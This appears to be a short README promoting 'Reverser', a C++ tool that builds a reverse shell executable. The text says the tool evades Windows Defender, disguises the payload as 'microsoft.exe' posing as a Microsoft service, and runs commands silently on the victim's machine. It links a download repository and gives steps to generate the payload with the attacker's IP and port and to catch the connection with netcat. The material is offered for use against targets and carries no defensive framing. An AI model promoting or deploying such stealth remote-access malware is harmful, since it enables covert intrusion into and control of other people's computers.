What is Reverser?
Reverser is a reverse shell tool generate executable reverse shell that 
bypass Windows Defender ⚔️.

#Tool Details:
- Language: The tool is developed in C++.
- Usage: Below is a guide on how to use it.

#Key Features 🤖:
1. Bypass Windows Defender: The tool is designed to evade detection by 
Windows Defender.
2. Stealth Execution: The generated shell appears as “microsoft.exe”, 
running as a normal Microsoft service in the Task Manager.
3. Silent Command Execution: Execute commands on the target machine 
without alerting the user.
4. Windows Subsystem Shell: The shell operates within the Windows 
subsystem.

# Installation 🚨:

First, download the tool from my GitHub repository:

[GitHub - salehalthini/reverser](https://github.com/salehalthini/reverser)

# Usage 👨🏻‍💻:

You have two options to use the tool:
1. Use the precompiled “.exe” available in the project.
2. Compile the “.cpp” code provided on GitHub.

# Generating a New Shell:

1. Open your terminal and run:
  ```
   reverser.exe <ip> <port>
```
   This command generates a new file named “microsoft.exe”, which acts as 
the reverse shell. You can deploy this on the target machine.

2. On your client machine (your device), run the following command to 
listen for incoming connections from `microsoft.exe`:
   ```
   nc -l <port>
   ```
   Replace `<port>` with the port number you specified in `reverser.exe`.



